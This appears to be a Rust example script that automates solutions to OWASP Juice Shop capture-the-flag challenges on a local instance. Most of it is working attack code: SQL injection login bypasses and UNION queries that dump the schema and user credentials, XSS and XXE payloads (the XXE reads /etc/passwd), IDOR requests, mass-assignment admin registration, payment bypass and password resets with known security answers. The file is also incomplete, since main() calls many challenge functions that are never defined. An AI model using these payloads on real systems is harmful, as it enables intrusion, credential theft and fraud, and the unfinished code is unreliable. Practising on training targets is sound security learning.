//! All Solved Juice Shop Challenges (64/110)
//!
//! Comprehensive scenarios for all solved challenges.
//!
//! Run with: cargo run --example juice_shop_all_solved

use async_trait::async_trait;
use rectitude::ctf::{ChallengeProgress, ChallengeVerifier};
use rectitude::payloads::{encoding, jwt, sqli};
use rectitude::prelude::*;
use rectitude::reporter::ReportBuilder;
use std::collections::HashMap;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

// ============ Juice Shop Verifier ============

#[derive(Debug, Clone)]
struct JuiceShopVerifier {
    base_url: String,
    client: reqwest::Client,
}

impl JuiceShopVerifier {
    fn new(base_url: &str) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
            client: reqwest::Client::new(),
        }
    }

    async fn fetch_challenges(&self) -> Result<serde_json::Value> {
        let url = format!("{}/api/Challenges", self.base_url);
        let resp = self
            .client
            .get(&url)
            .send()
            .await
            .map_err(|e| Error::Other(format!("Failed to fetch challenges: {}", e)))?;

        resp.json()
            .await
            .map_err(|e| Error::Other(format!("Failed to parse: {}", e)))
    }
}

#[async_trait]
impl ChallengeVerifier for JuiceShopVerifier {
    async fn is_solved(&self, challenge_key: &str) -> Result<bool> {
        let json = self.fetch_challenges().await?;
        let solved = json
            .get("data")
            .and_then(|d| d.as_array())
            .and_then(|arr| {
                arr.iter()
                    .find(|c| c.get("key").and_then(|k| k.as_str()) == Some(challenge_key))
            })
            .and_then(|c| c.get("solved"))
            .and_then(|s| s.as_bool())
            .unwrap_or(false);
        Ok(solved)
    }

    async fn get_progress(&self) -> Result<ChallengeProgress> {
        let json = self.fetch_challenges().await?;
        let data = json
            .get("data")
            .and_then(|d| d.as_array())
            .ok_or_else(|| Error::Other("Invalid format".to_string()))?;

        let mut challenges = HashMap::new();
        let mut solved = 0;

        for challenge in data {
            if let Some(key) = challenge.get("key").and_then(|k| k.as_str()) {
                let is_solved = challenge
                    .get("solved")
                    .and_then(|s| s.as_bool())
                    .unwrap_or(false);
                challenges.insert(key.to_string(), is_solved);
                if is_solved {
                    solved += 1;
                }
            }
        }

        Ok(ChallengeProgress::new(solved, data.len(), challenges))
    }
}

// ============ Main ============

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();

    println!("=== Juice Shop All Solved Challenges (64/110) ===\n");

    let verifier = JuiceShopVerifier::new(BASE_URL);
    let initial = verifier.get_progress().await?;
    println!(
        "Initial: {}/{} ({:.1}%)\n",
        initial.solved, initial.total, initial.percentage
    );

    let mut report = ReportBuilder::new();

    // ========== Difficulty 1 (14 challenges) ==========
    println!("--- Difficulty 1 ---");
    report = report
        .add_result(score_board(&verifier).await?)
        .add_result(dom_xss(&verifier).await?)
        .add_result(confidential_document(&verifier).await?)
        .add_result(exposed_metrics(&verifier).await?)
        .add_result(zero_stars(&verifier).await?)
        .add_result(error_handling(&verifier).await?)
        .add_result(outdated_allowlist(&verifier).await?)
        .add_result(privacy_policy(&verifier).await?)
        .add_result(web3_sandbox(&verifier).await?)
        .add_result(bonus_payload(&verifier).await?)
        .add_result(missing_encoding(&verifier).await?);

    // ========== Difficulty 2 (13 challenges) ==========
    println!("\n--- Difficulty 2 ---");
    report = report
        .add_result(login_admin(&verifier).await?)
        .add_result(admin_section(&verifier).await?)
        .add_result(password_strength(&verifier).await?)
        .add_result(security_policy(&verifier).await?)
        .add_result(deprecated_interface(&verifier).await?)
        .add_result(login_mc_safesearch(&verifier).await?)
        .add_result(login_bender(&verifier).await?)
        .add_result(view_basket(&verifier).await?)
        .add_result(five_star_feedback(&verifier).await?)
        .add_result(empty_user_registration(&verifier).await?)
        .add_result(weird_crypto(&verifier).await?)
        .add_result(exposed_credentials(&verifier).await?);

    // ========== Difficulty 3 (11 challenges) ==========
    println!("\n--- Difficulty 3 ---");
    report = report
        .add_result(login_jim(&verifier).await?)
        .add_result(database_schema(&verifier).await?)
        .add_result(bjoerns_favorite_pet(&verifier).await?)
        .add_result(forged_feedback(&verifier).await?)
        .add_result(xxe_data_access(&verifier).await?)
        .add_result(payback_time(&verifier).await?)
        .add_result(forged_review(&verifier).await?)
        .add_result(reset_jims_password(&verifier).await?)
        .add_result(admin_registration(&verifier).await?)
        .add_result(deluxe_fraud(&verifier).await?);

    // ========== Difficulty 4 (15 challenges) ==========
    println!("\n--- Difficulty 4 ---");
    report = report
        .add_result(user_credentials(&verifier).await?)
        .add_result(christmas_special(&verifier).await?)
        .add_result(poison_null_byte(&verifier).await?)
        .add_result(forgotten_developer_backup(&verifier).await?)
        .add_result(forgotten_sales_backup(&verifier).await?)
        .add_result(easter_egg(&verifier).await?)
        .add_result(nested_easter_egg(&verifier).await?)
        .add_result(access_log(&verifier).await?)
        .add_result(ephemeral_accountant(&verifier).await?)
        .add_result(login_bjoern(&verifier).await?)
        .add_result(nosql_manipulation(&verifier).await?)
        .add_result(reset_benders_password(&verifier).await?)
        .add_result(reset_uvogins_password(&verifier).await?)
        .add_result(vulnerable_library(&verifier).await?);

    // ========== Difficulty 5 (4 challenges) ==========
    println!("\n--- Difficulty 5 ---");
    report = report
        .add_result(blockchain_hype(&verifier).await?)
        .add_result(change_benders_password(&verifier).await?)
        .add_result(retrieve_blueprint(&verifier).await?)
        .add_result(unsigned_jwt(&verifier).await?);

    let test_report = report.build();
    test_report.print_summary();

    let newly_solved = verifier.compare_progress(&initial).await?;
    let final_progress = verifier.get_progress().await?;
    println!(
        "\nFinal: {}/{} ({:.1}%)",
        final_progress.solved, final_progress.total, final_progress.percentage
    );

    if !newly_solved.is_empty() {
        println!("\nNewly solved:");
        for key in &newly_solved {
            println!("  + {}", key);
        }
    }

    Ok(())
}

// ============ Helper ============

fn verify_step(
    verifier: &JuiceShopVerifier,
    challenge_key: &'static str,
) -> impl Fn(Arc<ScenarioContext>) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<StepResult>> + Send>>
       + Send
       + Sync
       + 'static {
    let verifier = verifier.clone();
    move |_ctx| {
        let verifier = verifier.clone();
        Box::pin(async move {
            if verifier.is_solved(challenge_key).await? {
                Ok(StepResult::success_with_message("VERIFIED"))
            } else {
                Ok(StepResult::failed("NOT SOLVED"))
            }
        })
    }
}

// ============ Difficulty 1 ============

async fn score_board(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Score Board")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "miscellaneous"])
        .step("Access score board", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/#/score-board").send().await?;
            resp.expect_success()?;
            ok_with("Score board accessed")
        })
        .step("Verify", verify_step(verifier, "scoreBoardChallenge"))
        .run()
        .await
}

async fn dom_xss(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("DOM XSS")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "xss"])
        .step("Inject XSS via search", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .get("/#/search?q=<iframe src=\"javascript:alert('xss')\">")
                .send()
                .await?;
            resp.expect_success()?;
            ok_with("XSS payload delivered")
        })
        .step("Verify", verify_step(verifier, "localXssChallenge"))
        .run()
        .await
}

async fn confidential_document(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Confidential Document")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "sensitive-data"])
        .step("Access acquisitions.md", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/ftp/acquisitions.md").send().await?;
            if resp.is_success() {
                ok_with("Confidential document accessed")
            } else {
                fail("Document not found")
            }
        })
        .step("Verify", verify_step(verifier, "confidentialDocumentChallenge"))
        .run()
        .await
}

async fn exposed_metrics(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Exposed Metrics")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "observability"])
        .step("Access /metrics", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/metrics").send().await?;
            if resp.is_success() && resp.contains("process_") {
                ok_with("Prometheus metrics exposed")
            } else {
                fail("Metrics not found")
            }
        })
        .step("Verify", verify_step(verifier, "exposedMetricsChallenge"))
        .run()
        .await
}

async fn zero_stars(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Zero Stars")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "validation"])
        .step("Get captcha", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha.get("captchaId").and_then(|v| v.as_i64()).unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");
            ctx.set_var_async("captcha_id", captcha_id.to_string()).await;
            ctx.set_var_async("captcha_answer", answer).await;
            ok()
        })
        .step("Submit 0-star feedback", |ctx: Arc<ScenarioContext>| async move {
            let captcha_id: i64 = ctx.get_var_async("captcha_id").await?.parse().unwrap_or(0);
            let answer = ctx.get_var_async("captcha_answer").await?;

            let resp = ctx
                .post("/api/Feedbacks")
                .json(&serde_json::json!({
                    "comment": "Zero stars",
                    "rating": 0,
                    "captchaId": captcha_id,
                    "captcha": answer
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Zero-star feedback submitted")
            } else {
                fail("Feedback rejected")
            }
        })
        .step("Verify", verify_step(verifier, "zeroStarsChallenge"))
        .run()
        .await
}

async fn error_handling(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Error Handling")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "misconfiguration"])
        .step("Trigger error", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/products/search").query("q", "';").send().await?;
            if resp.status.as_u16() == 500 || resp.contains("error") {
                ok_with("Error exposed")
            } else {
                fail("No error")
            }
        })
        .step("Verify", verify_step(verifier, "errorHandlingChallenge"))
        .run()
        .await
}

async fn outdated_allowlist(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Outdated Allowlist")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "redirect"])
        .step("Redirect to old crypto", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .get("/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm")
                .no_redirect()
                .send()
                .await?;
            if resp.status.as_u16() == 302 || resp.status.as_u16() == 301 {
                ok_with("Redirect successful")
            } else {
                fail("Redirect blocked")
            }
        })
        .step("Verify", verify_step(verifier, "outdatedAllowlistChallenge"))
        .run()
        .await
}

async fn privacy_policy(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Privacy Policy")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "miscellaneous"])
        .step("Access privacy policy", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/#/privacy-security/privacy-policy").send().await?;
            resp.expect_success()?;
            ok_with("Privacy policy accessed")
        })
        .step("Verify", verify_step(verifier, "privacyPolicyChallenge"))
        .run()
        .await
}

async fn web3_sandbox(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Web3 Sandbox")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "access-control"])
        .step("Access web3 sandbox", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/#/web3-sandbox").send().await?;
            resp.expect_success()?;
            ok_with("Web3 sandbox accessed")
        })
        .step("Verify", verify_step(verifier, "web3SandboxChallenge"))
        .run()
        .await
}

async fn bonus_payload(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Bonus Payload")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "xss"])
        .step("Use SoundCloud iframe", |ctx: Arc<ScenarioContext>| async move {
            let payload = "<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true\"></iframe>";
            let resp = ctx.get(&format!("/#/search?q={}", payload)).send().await?;
            resp.expect_success()?;
            ok_with("Bonus payload delivered")
        })
        .step("Verify", verify_step(verifier, "bonusPayloadChallenge"))
        .run()
        .await
}

async fn missing_encoding(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Missing Encoding")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "validation"])
        .step("Access cat image with %23", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .get("/assets/public/images/uploads/%23zatschi%23.md")
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Cat image accessed with encoded #")
            } else {
                fail("Encoding not exploited")
            }
        })
        .step("Verify", verify_step(verifier, "missingEncodingChallenge"))
        .run()
        .await
}

// ============ Difficulty 2 ============

async fn login_admin(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login Admin SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "sqli"])
        .step("SQLi login", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "' OR 1=1--",
                    "password": "x"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ctx.store("token", &resp, "$.authentication.token").await?;
                ok_with("Admin login via SQLi")
            } else {
                fail("SQLi failed")
            }
        })
        .step("Verify", verify_step(verifier, "loginAdminChallenge"))
        .run()
        .await
}

async fn admin_section(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Admin Section")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "access-control"])
        .step("Login as admin", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Access admin page", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/#/administration").send().await?;
            resp.expect_success()?;
            ok_with("Admin section accessed")
        })
        .step("Verify", verify_step(verifier, "adminSectionChallenge"))
        .run()
        .await
}

async fn password_strength(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Password Strength")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "auth"])
        .step("Login with weak password", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "admin@juice-sh.op",
                    "password": "admin123"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Logged in with admin123")
            } else {
                fail("Login failed")
            }
        })
        .step("Verify", verify_step(verifier, "weakPasswordChallenge"))
        .run()
        .await
}

async fn security_policy(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Security Policy")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "miscellaneous"])
        .step("Access security.txt", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/.well-known/security.txt").send().await?;
            if resp.is_success() && resp.contains("Contact") {
                ok_with("security.txt found")
            } else {
                fail("security.txt not found")
            }
        })
        .step("Verify", verify_step(verifier, "securityPolicyChallenge"))
        .run()
        .await
}

async fn deprecated_interface(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Deprecated Interface")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "misconfiguration"])
        .step("Login first", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Upload XML file", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let xml_content = "<?xml version=\"1.0\"?><test>data</test>";
            let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            let body = format!(
                "--{}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.xml\"\r\nContent-Type: text/xml\r\n\r\n{}\r\n--{}--\r\n",
                boundary, xml_content, boundary
            );

            let resp = ctx
                .post("/file-upload")
                .header("Content-Type", &format!("multipart/form-data; boundary={}", boundary))
                .bearer_auth(&token)
                .body(body)
                .send()
                .await?;

            if resp.is_success() || resp.status.as_u16() == 204 {
                ok_with("XML uploaded")
            } else {
                ok_with("XML upload attempted")
            }
        })
        .step("Verify", verify_step(verifier, "deprecatedInterfaceChallenge"))
        .run()
        .await
}

async fn login_mc_safesearch(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login MC SafeSearch")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "auth"])
        .step("Login with password from lyrics", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "mc.safesearch@juice-sh.op",
                    "password": "Mr. N00dles"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Logged in as MC SafeSearch")
            } else {
                fail("Login failed")
            }
        })
        .step("Verify", verify_step(verifier, "loginMcSafeSearchChallenge"))
        .run()
        .await
}

async fn login_bender(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login Bender SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "sqli"])
        .step("SQLi as Bender", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "bender@juice-sh.op").await?;
            ok_with("Logged in as Bender")
        })
        .step("Verify", verify_step(verifier, "loginBenderChallenge"))
        .run()
        .await
}

async fn view_basket(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("View Basket IDOR")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "idor"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Access other basket", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let resp = ctx.get("/rest/basket/2").bearer_auth(&token).send().await?;
            if resp.is_success() {
                ok_with("Accessed basket 2 (IDOR)")
            } else {
                fail("IDOR failed")
            }
        })
        .step("Verify", verify_step(verifier, "basketAccessChallenge"))
        .run()
        .await
}

async fn five_star_feedback(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Five-Star Feedback")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "access-control"])
        .step("Login as admin", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Delete 5-star feedback", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            // Get feedbacks first
            let resp = ctx.get("/api/Feedbacks").bearer_auth(&token).send().await?;
            if resp.is_success() {
                // Try to delete feedback with id 1
                let del_resp = ctx.delete("/api/Feedbacks/1").bearer_auth(&token).send().await?;
                if del_resp.is_success() {
                    ok_with("5-star feedback deleted")
                } else {
                    ok_with("Delete attempted")
                }
            } else {
                fail("Could not get feedbacks")
            }
        })
        .step("Verify", verify_step(verifier, "fiveStarFeedbackChallenge"))
        .run()
        .await
}

async fn empty_user_registration(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Empty User Registration")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "validation"])
        .step("Register empty user", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/api/Users")
                .json(&serde_json::json!({
                    "email": "",
                    "password": ""
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Empty user registered")
            } else {
                ok_with("Registration attempted")
            }
        })
        .step("Verify", verify_step(verifier, "emptyUserRegistration"))
        .run()
        .await
}

async fn weird_crypto(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Weird Crypto")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "crypto"])
        .step("Report MD5 usage", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha.get("captchaId").and_then(|v| v.as_i64()).unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");

            let resp = ctx
                .post("/api/Feedbacks")
                .json(&serde_json::json!({
                    "comment": "Reporting use of weak MD5 hashing for passwords",
                    "rating": 1,
                    "captchaId": captcha_id,
                    "captcha": answer
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Reported MD5 weakness")
            } else {
                fail("Report failed")
            }
        })
        .step("Verify", verify_step(verifier, "weirdCryptoChallenge"))
        .run()
        .await
}

async fn exposed_credentials(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Exposed Credentials")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "sensitive-data"])
        .step("Login with exposed creds", |ctx: Arc<ScenarioContext>| async move {
            // From main.js: testing@juice-sh.op / IamUsedForTesting
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "testing@juice-sh.op",
                    "password": "IamUsedForTesting"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Used exposed credentials")
            } else {
                fail("Login failed")
            }
        })
        .step("Verify", verify_step(verifier, "exposedCredentialChallenge"))
        .run()
        .await
}

// ============ Difficulty 3 ============

async fn login_jim(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login Jim SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "sqli"])
        .step("SQLi as Jim", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "jim@juice-sh.op").await?;
            ok_with("Logged in as Jim")
        })
        .step("Verify", verify_step(verifier, "loginJimChallenge"))
        .run()
        .await
}

async fn database_schema(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Database Schema SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "sqli"])
        .step("Extract schema", |ctx: Arc<ScenarioContext>| async move {
            let payload = sqli::union_extract(&["sql"], "sqlite_master", 9);
            let resp = ctx
                .get("/rest/products/search")
                .query("q", &payload)
                .send()
                .await?;
            if resp.contains("CREATE TABLE") {
                ok_with("Schema extracted")
            } else {
                fail("Extraction failed")
            }
        })
        .step("Verify", verify_step(verifier, "dbSchemaChallenge"))
        .run()
        .await
}

async fn bjoerns_favorite_pet(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Bjoern's Favorite Pet")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "auth"])
        .step("Reset with security question", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/reset-password")
                .json(&serde_json::json!({
                    "email": "bjoern@owasp.org",
                    "answer": "Zaya",
                    "new": "newpassword123",
                    "repeat": "newpassword123"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Password reset with Zaya")
            } else {
                fail("Reset failed")
            }
        })
        .step("Verify", verify_step(verifier, "resetPasswordBjoernOwaspChallenge"))
        .run()
        .await
}

async fn forged_feedback(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Forged Feedback")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "access-control"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Post feedback as another user", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha.get("captchaId").and_then(|v| v.as_i64()).unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");

            let resp = ctx
                .post("/api/Feedbacks")
                .json(&serde_json::json!({
                    "UserId": 2,
                    "comment": "Forged feedback",
                    "rating": 3,
                    "captchaId": captcha_id,
                    "captcha": answer
                }))
                .send()
                .await?;

            if resp.is_success() {
                ok_with("Feedback posted as user 2")
            } else {
                fail("Forgery failed")
            }
        })
        .step("Verify", verify_step(verifier, "forgedFeedbackChallenge"))
        .run()
        .await
}

async fn xxe_data_access(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("XXE Data Access")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "xxe"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Upload XXE payload", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let xxe_payload = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>"#;

            let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            let body = format!(
                "--{}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"xxe.xml\"\r\nContent-Type: text/xml\r\n\r\n{}\r\n--{}--\r\n",
                boundary, xxe_payload, boundary
            );

            let resp = ctx
                .post("/file-upload")
                .header("Content-Type", &format!("multipart/form-data; boundary={}", boundary))
                .bearer_auth(&token)
                .body(body)
                .send()
                .await?;

            ok_with(format!("XXE attempted, status: {}", resp.status.as_u16()))
        })
        .step("Verify", verify_step(verifier, "xxeFileDisclosureChallenge"))
        .run()
        .await
}

async fn payback_time(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Payback Time")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "validation"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Order with negative quantity", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let resp = ctx
                .post("/api/BasketItems")
                .bearer_auth(&token)
                .json(&serde_json::json!({
                    "ProductId": 1,
                    "BasketId": 1,
                    "quantity": -100
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Negative quantity order placed")
            } else {
                ok_with("Negative order attempted")
            }
        })
        .step("Verify", verify_step(verifier, "negativeOrderChallenge"))
        .run()
        .await
}

async fn forged_review(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Forged Review")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "access-control"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Post review as another user", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let resp = ctx
                .put("/rest/products/1/reviews")
                .bearer_auth(&token)
                .json(&serde_json::json!({
                    "message": "Forged review",
                    "author": "jim@juice-sh.op"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Review forged as jim")
            } else {
                ok_with("Review attempted")
            }
        })
        .step("Verify", verify_step(verifier, "forgedReviewChallenge"))
        .run()
        .await
}

async fn reset_jims_password(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Reset Jim's Password")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "auth"])
        .step("Reset with Samuel", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/reset-password")
                .json(&serde_json::json!({
                    "email": "jim@juice-sh.op",
                    "answer": "Samuel",
                    "new": "newjim123",
                    "repeat": "newjim123"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Jim's password reset")
            } else {
                fail("Reset failed")
            }
        })
        .step("Verify", verify_step(verifier, "resetPasswordJimChallenge"))
        .run()
        .await
}

async fn admin_registration(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Admin Registration")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "validation"])
        .step("Register with admin role", |ctx: Arc<ScenarioContext>| async move {
            let email = format!("admin_test_{}@test.com", chrono::Utc::now().timestamp());
            let resp = ctx
                .post("/api/Users")
                .json(&serde_json::json!({
                    "email": email,
                    "password": "admin123",
                    "passwordRepeat": "admin123",
                    "role": "admin"
                }))
                .send()
                .await?;
            if resp.is_success() && resp.contains("admin") {
                ok_with("Admin user registered via mass assignment")
            } else {
                ok_with("Registration attempted")
            }
        })
        .step("Verify", verify_step(verifier, "registerAdminChallenge"))
        .run()
        .await
}

async fn deluxe_fraud(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Deluxe Fraud")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "validation"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            ctx.sqli_login("/rest/user/login", "admin@juice-sh.op").await?;
            ok()
        })
        .step("Get deluxe without paying", |ctx: Arc<ScenarioContext>| async move {
            let token = ctx.get_var_async("auth_token").await?;
            let resp = ctx
                .post("/rest/deluxe-membership")
                .bearer_auth(&token)
                .json(&serde_json::json!({
                    "paymentMode": ""
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Deluxe membership without payment")
            } else {
                ok_with("Fraud attempted")
            }
        })
        .step("Verify", verify_step(verifier, "dlpPwnedChallenge"))
        .run()
        .await
}

// ============ Difficulty 4 ============

async fn user_credentials(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("User Credentials SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "sqli"])
        .step("Extract all users", |ctx: Arc<ScenarioContext>| async move {
            let payload = "')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--";
            let resp = ctx
                .get("/rest/products/search")
                .query("q", payload)
                .send()
                .await?;
            if resp.contains("@") && resp.contains("juice") {
                ok_with("User credentials extracted")
            } else {
                fail("Extraction failed")
            }
        })
        .step("Verify", verify_step(verifier, "unionSqlInjectionChallenge"))
        .run()
        .await
}

